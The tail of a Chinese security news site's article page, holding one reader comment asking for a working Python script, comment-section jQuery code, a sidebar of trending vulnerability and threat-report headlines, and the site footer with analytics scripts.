                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16357" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">能否分享能用的python脚本</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4012" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
